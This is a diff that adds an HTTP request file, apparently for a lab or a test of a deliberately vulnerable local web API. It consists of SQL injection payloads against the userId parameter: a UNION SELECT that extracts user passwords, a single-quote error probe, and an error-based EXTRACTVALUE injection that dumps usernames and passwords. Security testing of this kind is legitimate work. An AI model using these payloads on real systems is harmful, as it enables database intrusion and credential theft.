@@ -1,0 +1,14 @@
+
+GET http://localhost:13233/api/items
+    ?userId=1%20union%20select%20user_id%20as%20item_id%2C%20user_password%20as%20item_name%2C%20user_id%20as%20item_category_id%2C%20user_id%20as%20item_owner_id%20from%20db1.users%3B
+
+###
+http://localhost:13233/
+
+###
+GET http://localhost:13233/api/items
+    ?userId=123'
+
+###
+GET http://localhost:13233/api/items
+    ?userId=1%20AND%20EXTRACTVALUE%280%2C%20%28SELECT%20CONCAT%28%27%24%27%2Cuser_name%2C%27%3A%27%2Cuser_password%29%20FROM%20db1.users%29%29
